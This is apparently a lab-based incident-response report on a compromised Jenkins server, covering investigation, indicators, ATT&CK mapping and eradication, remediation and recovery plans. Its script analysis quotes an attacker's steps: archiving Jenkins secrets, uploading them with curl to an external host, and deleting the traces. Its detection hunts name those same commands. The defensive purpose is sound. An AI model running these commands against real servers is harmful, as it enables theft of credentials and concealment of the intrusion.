# Eradication, Remediation and Recovery

## Executive Summary

This case study documents the investigation of a compromised Jenkins server at SwiftSpend Financial and the actions required to eradicate the threat, remediate the underlying weaknesses, and return the service to production safely.

The investigation established that:

- The reused `swiftspend_admin` credentials provided access to Jenkins.
- A Jenkins project named `BackUp` invoked `/var/lib/jenkins/backup.sh`.
- The script collected Jenkins configurations, jobs, plugins, users, and secrets.
- The collected data was prepared as `backup.tar.gz` for an HTTP upload to `backup.swiftspend.com:6996/upload`.
- The script included commands to delete the staging directory and archive after the upload attempt.
- Jenkins contained no numbered build directories for the `BackUp` project, so successful execution and exfiltration were not confirmed by the available build history.

The evidence confirms a prepared collection and exfiltration capability. It does not, by itself, prove that the archive was successfully transferred. Jenkins, endpoint, proxy, DNS, firewall, and network telemetry would be required to make that determination.

---

## Investigation Scope

The investigation focused on:

- The account used for initial access.
- Jenkins users and administrative access.
- Suspicious Jenkins jobs and shell commands.
- Collection, archive, upload, and clean-up activity.
- External infrastructure referenced by the script.
- Indicators suitable for environment-wide threat hunting.
- Eradication, remediation, and recovery requirements.

> The Jenkins administrator password was retrieved from the lab environment but is intentionally not disclosed in this report.

---

## Eradication Decision Principles

Eradication should begin only after the incident has been scoped and the required evidence has been preserved. Acting too early can alert the threat actor, destroy evidence, or leave unidentified persistence elsewhere in the environment.

The selected technique should reflect system criticality, confidence in the investigation, acceptable downtime, and the level of assurance required.

| Technique | Appropriate use | Advantage | Main risk |
|---|---|---|---|
| Automated eradication | Known malware or well-understood artefacts | Fast and repeatable | May miss custom or fileless activity |
| Targeted clean-up | Critical systems where downtime must be minimised | Preserves the existing service | Depends on complete scoping and precise removal |
| Complete rebuild | Systems whose integrity cannot be established | Restores a trusted baseline | Requires downtime, validation, and controlled restoration |

For this Jenkins server, a rebuild from a trusted baseline is the preferred option if the team cannot establish the integrity of the existing installation, credentials, plugins, jobs, and secrets.

---

## Practical Investigation: Compromised Jenkins Server

### Initial Access

The account that provided the foothold was:

```text
swiftspend_admin
```

The password had been stored in plaintext on another system and reused across multiple platforms. This created several weaknesses:

- Plaintext credential storage.
- Password reuse between services.
- Missing multi-factor authentication.
- Insufficient separation of administrative accounts.
- Weak privileged-access controls.

The use of valid credentials is important because the activity may appear legitimate unless authentication, Jenkins, and endpoint events are correlated.

---

### Jenkins User Review

Jenkins user configuration files were searched for additional accounts and associated email addresses:

```bash
sudo grep -RniE "emailAddress|mail|email" /var/lib/jenkins/users 2>/dev/null
```

The review identified the following account:

| Field | Value |
|---|---|
| Username | `infraadmin` |
| Email address | `infra_admin@swiftspend.finance` |

<img width="1702" height="123" alt="Jenkins user configuration showing the infraadmin email address" src="https://github.com/user-attachments/assets/8c7917a3-58ea-4297-80d2-78fa55b4c22a" />

> Evidence 01 — Jenkins user configuration linked `infraadmin` to `infra_admin@swiftspend.finance`.

The available evidence does not establish whether this account was malicious. It should be validated against approved account records, assigned permissions, authentication history, and recent administrative activity.

---

### Suspicious Jenkins Project

Jenkins job configurations were searched for shell commands:

```bash
sudo grep -Rni -A10 -B5 "<command>" /var/lib/jenkins/jobs 2>/dev/null
```

A project named `BackUp` invoked:

```bash
/bin/bash /var/lib/jenkins/backup.sh
```

<img width="1116" height="275" alt="BackUp Jenkins job configured to execute backup.sh with Bash" src="https://github.com/user-attachments/assets/e8d0e16c-a056-4ad9-90ca-6eaeb5d1f4b2" />

> Evidence 02 — The `BackUp` job was configured to execute a local shell script.

The project name resembled a legitimate administrative task. Its underlying script therefore required direct examination before the job could be classified.

---

### Build History

The build directory was examined with:

```bash
sudo ls -la /var/lib/jenkins/jobs/BackUp/builds
```

No numbered build directories were present.

| Project | Jenkins-recorded executions |
|---|---:|
| `BackUp` | `0` |

<img width="897" height="131" alt="BackUp Jenkins build directory with no numbered build records" src="https://github.com/user-attachments/assets/3cf79be9-b448-4a5f-adc4-42a5c6fb1c7e" />

> Evidence 03 — Jenkins did not contain a recorded build for the suspicious project.

This is an important limitation. It supports the conclusion that Jenkins did not retain a normal build record, but it does not prove the script never executed. Build history could have been removed, the script could have been launched outside Jenkins, or relevant records could exist in other telemetry.

---

### Malicious Script Analysis

The script invoked by the Jenkins project was reviewed with:

```bash
sudo cat /var/lib/jenkins/backup.sh
```

The script contained four stages.

#### 1. Data Collection

It created a staging directory and copied sensitive Jenkins data, including:

- XML configuration files.
- Job configurations.
- Node information.
- Installed plugins.
- Files from the Jenkins secrets directory.
- Jenkins user information.

#### 2. Archive Creation

The staged data was compressed into an archive:

```bash
tar czvf backup.tar.gz backup/
```

#### 3. HTTP Upload

The script prepared an HTTP POST request to upload the archive:

```bash
curl -XPOST http://backup.swiftspend.com:6996/upload \
  -F 'files=@backup.tar.gz'
```

#### 4. Artefact Removal

The final commands deleted the staging directory and archive:

```bash
rm -rf /var/lib/jenkins/backup/
rm -rf /var/lib/jenkins/backup.tar.gz
```

<img width="1621" height="445" alt="backup.sh commands for Jenkins data collection, archive upload, and artefact removal" src="https://github.com/user-attachments/assets/0d2742a7-19ac-4a00-9c22-6f34daa54097" />

> Evidence 04 — `backup.sh` implemented collection, archiving, HTTP upload, and local clean-up.

The script is inconsistent with a normal local backup because it copies secrets and user data, uploads the archive to an external destination over unencrypted HTTP, and removes the local artefacts afterwards.

---

### Suspicious Infrastructure

The destination referenced by the script was resolved from the affected server:

```bash
getent hosts backup.swiftspend.com
```

| Indicator type | Value |
|---|---|
| Domain | `backup.swiftspend.com` |
| IP address | `194.26.135.132` |
| Destination port | `6996/TCP` |
| Protocol | HTTP |
| Upload path | `/upload` |

<img width="739" height="48" alt="DNS resolution of backup.swiftspend.com to 194.26.135.132" src="https://github.com/user-attachments/assets/6d6a86e7-9d5d-49ca-a557-078b953741c5" />

> Evidence 05 — The suspected upload domain resolved to `194.26.135.132`.

The IP address was reviewed in AbuseIPDB, which recorded its location as the Russian Federation.

<img width="1355" height="693" alt="AbuseIPDB enrichment for the suspected exfiltration IP address" src="https://github.com/user-attachments/assets/475420d9-cea0-4308-908d-32c6415bfe56" />

> Evidence 06 — External enrichment added context to the IP address.

Geolocation and reputation data are enrichment only. They do not identify the operator, prove malicious ownership, or establish the threat actor's physical location. Internal network telemetry remains necessary to determine whether any connection or upload occurred.

---

## Evidence Assessment

| Finding | Evidence | Confidence | Assessment |
|---|---|---|---|
| Valid credentials provided Jenkins access | Reused `swiftspend_admin` credentials | High | Initial foothold confirmed in the scenario |
| The `BackUp` project invoked `backup.sh` | Jenkins job configuration | High | Malicious execution path configured |
| The script collected sensitive Jenkins data | Static script contents | High | Collection capability confirmed |
| The script prepared an external HTTP upload | Static `curl` command | High | Exfiltration capability confirmed |
| The script executed through Jenkins | No numbered Jenkins build record | Low | Not confirmed by available build history |
| Data was successfully exfiltrated | No supporting proxy, firewall, or packet evidence provided | Low | Not confirmed |

---

## Indicators of Compromise

| Type | Indicator | Context |
|---|---|---|
| Compromised account | `swiftspend_admin` | Plaintext exposure and credential reuse |
| Jenkins account | `infraadmin` | Requires ownership and activity validation |
| Email address | `infra_admin@swiftspend.finance` | Associated with `infraadmin` |
| Jenkins project | `BackUp` | Invoked the suspicious script |
| Script | `/var/lib/jenkins/backup.sh` | Collection and upload logic |
| Staging directory | `/var/lib/jenkins/backup/` | Temporary data collection location |
| Archive | `/var/lib/jenkins/backup.tar.gz` | Prepared collection archive |
| Domain | `backup.swiftspend.com` | Suspected upload destination |
| IP address | `194.26.135.132` | Resolved destination IP address |
| Port | `6996/TCP` | HTTP destination port |
| URI path | `/upload` | Upload endpoint |

---

## MITRE ATT&CK Mapping

The following mappings describe the capability visible in the evidence. They should not be interpreted as proof that every stage executed successfully.

| Evidence | Technique | ID | Confidence |
|---|---|---|---|
| Reused credentials used to access Jenkins | Valid Accounts | `T1078` | High |
| Bash used to run the job script | Unix Shell | `T1059.004` | High |
| Jenkins configurations, users, and secrets copied locally | Data from Local System | `T1005` | High |
| Collected data compressed with `tar` | Archive Collected Data: Archive via Utility | `T1560.001` | High |
| Archive prepared for upload over unencrypted HTTP | Exfiltration Over Unencrypted Non-C2 Protocol | `T1048.003` | Medium |
| Staging directory and archive deleted | File Deletion | `T1070.004` | High for capability; execution unconfirmed |

The activity reached the **Actions on Objectives** phase of the Cyber Kill Chain because the configured job was designed to collect and transfer sensitive Jenkins information.

---

## Eradication Plan

All required forensic evidence should be preserved before removal begins.

1. Disable `swiftspend_admin` and revoke active sessions, tokens, passwords, and SSH keys.
2. Rotate every credential reused by the account across other systems.
3. Export and preserve the `BackUp` job configuration, `backup.sh`, relevant Jenkins logs, and file metadata.
4. Preserve available volatile and network evidence where operationally possible.
5. Remove the `BackUp` Jenkins project after evidence collection.
6. Remove `/var/lib/jenkins/backup.sh`, the staging directory, and residual archive copies.
7. Block and monitor `backup.swiftspend.com`, `194.26.135.132`, and `6996/TCP` where operationally appropriate.
8. Review `infraadmin` and all other Jenkins users, credentials, API tokens, SSH keys, and permissions.
9. Hunt across the environment for the identified account, paths, domain, IP address, port, and command patterns.
10. Review Jenkins, endpoint, proxy, DNS, firewall, and network telemetry to determine whether the script executed or data left the environment.
11. Rebuild Jenkins from a trusted baseline if system integrity cannot be established.

---

## Remediation Plan

The following changes address the weaknesses that enabled the compromise:

- Eliminate plaintext-password storage.
- Prohibit password reuse between platforms.
- Require multi-factor authentication for administrative access.
- Separate Jenkins administration from operating-system administration.
- Apply least privilege to Jenkins users, service accounts, and credentials.
- Store secrets in an approved secrets-management platform.
- Patch Jenkins, its operating system, and all installed plugins.
- Review and restrict who can create, modify, and execute Jenkins jobs.
- Apply outbound allow-listing or proxy controls to the Jenkins server.
- Segment Jenkins from unrelated systems and subnets.
- Alert on Jenkins configuration changes and access to the secrets directory.
- Detect suspicious use of `bash`, `tar`, `curl`, and deletion commands from Jenkins processes.
- Review privileged access through a request-and-approval process.

---

## Detection and Threat-Hunting Opportunities

The following behaviours should be searched across endpoint and network telemetry:

- A Jenkins or Java parent process spawning `bash`, `tar`, `curl`, or `rm`.
- Creation of `backup.tar.gz` or similar archives under Jenkins directories.
- Recursive access to `/var/lib/jenkins/secrets/` or `/var/lib/jenkins/users/`.
- New or modified Jenkins jobs containing shell commands.
- DNS queries for `backup.swiftspend.com`.
- Connections to `194.26.135.132` or destination port `6996`.
- HTTP POST requests to `/upload`.
- Authentication by `swiftspend_admin` from unusual systems, times, or source addresses.

Example hunt logic, with field names adapted to the available telemetry:

```spl
index=endpoint host=<jenkins_host>
(process_name IN ("bash", "tar", "curl", "rm")
AND parent_process_name IN ("java", "jenkins"))
| table _time host user parent_process_name process_name command_line
```

```spl
index=network
(dest_ip="194.26.135.132" OR query="backup.swiftspend.com" OR dest_port=6996)
| table _time src_ip dest_ip dest_port query url action
```

These searches are investigation starting points, not production-ready detections. They require environment-specific field mapping, baselining, and false-positive testing.

---

## Recovery Plan

Before returning Jenkins to production, the organisation should:

1. Rebuild from a trusted baseline if the existing installation cannot be trusted.
2. Restore only verified jobs, plugins, configurations, and business data.
3. Rotate Jenkins credentials, API tokens, secrets, keys, and reused account passwords.
4. Confirm that the malicious project, script, staging directory, archive, and indicators are absent.
5. Validate Jenkins and plugin patch levels.
6. Test outbound filtering against the identified infrastructure.
7. Test new endpoint, network, and Jenkins detections.
8. Reconnect the server in a controlled stage with enhanced monitoring.
9. Monitor for repeated or modified attacker activity.
10. Obtain security and service-owner approval before full production use.

### Recovery Exit Criteria

| Control | Required result |
|---|---|
| Credential rotation | All exposed and reused credentials revoked and replaced |
| Jenkins integrity | Trusted rebuild completed or existing installation validated |
| Artefact validation | No malicious job, script, archive, or staging directory remains |
| Patch validation | Operating system, Jenkins, and plugins meet the approved baseline |
| Egress controls | Identified destination and unauthorised outbound paths are blocked |
| Detection validation | New monitoring produces expected alerts during controlled testing |
| Threat hunt | No additional affected accounts, hosts, or Jenkins instances identified |
| Approval | Security and service owners approve production restoration |

---

## Prioritised Action Plan

| Time frame | Priority actions |
|---|---|
| Immediate | Preserve evidence, disable the compromised account, revoke access, block indicators, and hunt for related activity |
| Near-term | Remove malicious artefacts, rotate credentials and secrets, patch Jenkins, validate accounts, and restrict egress |
| Mid-term | Rebuild or validate the server, improve segmentation, deploy detections, and test recovery controls |
| Long-term | Mature privileged-access management, secrets handling, Jenkins governance, and automated secure baselines |

---

## Conclusion

The investigation confirmed that reused `swiftspend_admin` credentials exposed the Jenkins environment and that the `BackUp` project contained a script designed to collect sensitive Jenkins data, create an archive, upload it to external infrastructure, and remove local artefacts.

The available Jenkins build history did not prove that the project executed, and the evidence did not confirm successful data exfiltration. This distinction is important: the malicious capability is confirmed, while execution and impact require further telemetry.

The recommended response is to preserve evidence, revoke the compromised access, remove the malicious Jenkins artefacts, rotate exposed credentials and secrets, hunt across the wider environment, and rebuild the server if its integrity cannot be established. Recovery should occur only after the defined exit criteria have been met and the new controls have been validated.
